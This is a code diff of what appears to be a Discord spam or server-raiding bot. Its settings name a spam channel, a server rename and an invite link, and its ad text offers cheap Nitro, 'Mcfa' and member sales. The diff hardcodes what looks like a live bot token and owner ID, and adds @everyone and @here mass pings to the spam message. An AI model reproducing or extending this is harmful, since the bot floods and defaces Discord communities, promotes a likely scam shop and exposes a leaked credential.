@@ -9,15 +9,15 @@ const client = new Client({
   ]
 });
 
-const TOKEN      = 'BOT_TOKEN_HERE';              // ← your bot token (Bot MTE...)
-const OWNER      = 'YOUR_DISCORD_ID_HERE';        // only this user can trigger
+const TOKEN      = 'MTQ3OTg3NjczNTI0MjczMTU3MQ.GyNKtv.RjqcxuwwDfAQ4KlxJ5EepZ3cALVDEZ2Qsil1sM';              // ← your bot token (Bot MTE...)
+const OWNER      = '1479770170389172285';        // only this user can trigger
 const PING       = '<@1479770170389172285>';
 const INVITE     = 'discord.gg/n1tromaker';
 const SPAM_NAME  = 'best-shop';
 const NEW_SERVER_NAME = '.gg/n1tromaker';
 
 const SPAM_TEXT = `
-__**Nitro & Mcfa & Member shop**__
+__** @everyone @here Nitro & Mcfa & Member shop**__
 Cheapest supplier ever ${PING}
 
 • Nitro boost for 2.5$
